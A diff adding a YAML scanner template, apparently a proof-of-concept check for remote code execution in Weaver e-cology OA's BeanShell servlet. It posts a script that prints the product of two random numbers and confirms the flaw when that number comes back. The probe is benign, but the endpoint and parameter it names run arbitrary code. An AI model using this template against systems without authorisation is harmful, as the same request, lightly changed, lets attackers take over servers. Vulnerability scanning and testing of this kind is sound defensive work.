@@ -1,0 +1,24 @@
+name: yaml-poc-weaver-weaver_e_cology_oa-rce-CT-158320
+binding: 24fda0c4-669b-44cc-a4a3-1fa600a4c875
+detail:
+    author: system_user
+    vulnerability:
+        id: 2609fafe-6ae2-45fa-af65-3e0562b32f7b
+        level: critical
+    warning: Harmless
+transport: http
+set:
+    r1: randomInt(40000, 44800)
+    r2: randomInt(40000, 44800)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /weaver/bsh.servlet.BshServlet
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: bsh.script=print%28{{r1}}*{{r2}}%29&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
+expression: r0()
